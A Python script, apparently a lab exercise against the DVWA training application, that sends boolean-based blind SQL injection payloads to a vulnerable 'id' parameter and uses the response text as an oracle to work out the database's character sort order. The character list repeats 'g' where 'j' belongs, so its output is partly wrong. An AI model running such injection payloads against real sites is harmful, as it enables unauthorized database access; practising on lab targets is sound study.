import requests

url = "http://192.168.1.221/dvwa_test/vulnerabilities/sqli/?"
header = {
    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    "accept-encoding": "gzip, deflate",
    "accept-language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
    "connection": "close",
    "cookie": "experimentation_subject_id=eyJfcmFpbHMiOnsibWVzc2FnZSI6IkltRmpOMlZpWVdFNExUTTVNRFl0TkRnd05DMDRNRFl6TFRnMFlXSTRaRGhoTURFMVlpST0iLCJleHAiOm51bGwsInB1ciI6ImNvb2tpZS5leHBlcmltZW50YXRpb25fc3ViamVjdF9pZCJ9fQ%3D%3D--fa61bc8250f428fab74992fe3b6e868f5908d932; sidebar_collapsed=false; PHPSESSID=er8hio283j113obiietcrkugt7; security=low",
    "host": "192.168.1.221",
    "referer": "http://192.168.1.221/dvwa_test/vulnerabilities/sqli/",
    "upgrade-insecure-requests": "1",
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0"
}
asc=[';',':','!','"','#','$','%','&','\'','(',')','*','+',',','-','.','/','<','=','>','?','@','[','\\',']','^','_','`','{','|','}','~','0','1','2','3','4','5','6','7','8','9','a','b','c','d','e','f','g','h','i','g','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z']
# print(asc[67])
#asc长度为68
#asc长度为36  假定没有特殊字符
#主要是大小写 97:a 65:A  大写字母默认比较时会当做小写字母  
#夹在中间大小写字母的 91:[  92:\  93:] 94:^ 95: _   96:`  和   32-47之间的符号! " # $ % & ' ( ) * + , - . /  和  123往后的 123:{ 124:| 125:} 126:~ 127:DEL  这些可显示的特殊字符都比数字和字母小  这些特殊字符内部和数字字母内部比较还是遵循ASCII码大小
for j in range(0,67):
    min = asc[j]
    for i in range(j+1,68):
        params1={"id":"2' and (values row('{}'<'{}'))-- ".format(asc[i],min),"Submit":"Submit"}
        print(params1)
        r=requests.get(url=url,params=params1,headers=header)
        if "Gordon"  in r.text:
        # if(asc[i]<min):
            min = asc[i]
            t = asc[j]
            asc[j] = asc[i]
            asc[i] = t
    
print(asc)
#跑出['_', '-', ',', ';', ':', '!', '?', '.', "'", '"', '(', ')', '[', ']', '{', '}', '@', '*', '/', '&', '#', '%', '`', '\\', '^', '+', '<', '=', '>', '|', '~', '$', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'g', 'h', 'i', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z']
